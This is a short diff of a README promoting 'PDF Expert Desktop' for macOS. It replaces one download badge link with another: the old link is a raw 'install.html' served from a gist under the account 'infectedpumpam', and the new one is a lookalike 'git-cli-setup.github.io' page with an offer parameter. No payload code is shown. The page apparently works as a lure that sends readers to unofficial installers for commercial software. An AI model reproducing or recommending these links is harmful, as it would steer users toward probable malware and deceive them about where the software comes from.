@@ -2,7 +2,7 @@
 
 PDF Expert Desktop is a fast and intuitive PDF solution for macOS. It allows users to read, annotate, edit, and sign PDF documents seamlessly, combining professional features with a simple, clean interface.
 
-<a href="https://gistcdn.githack.com/infectedpumpam/5a68d391077d8b388829956da5d311bc/raw/4c5920485a1a79f5e1efc61a4ba9b8c189bfc95d/install.html?offer=PDFExpert" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=PDFExpert" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20PDFExpert%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
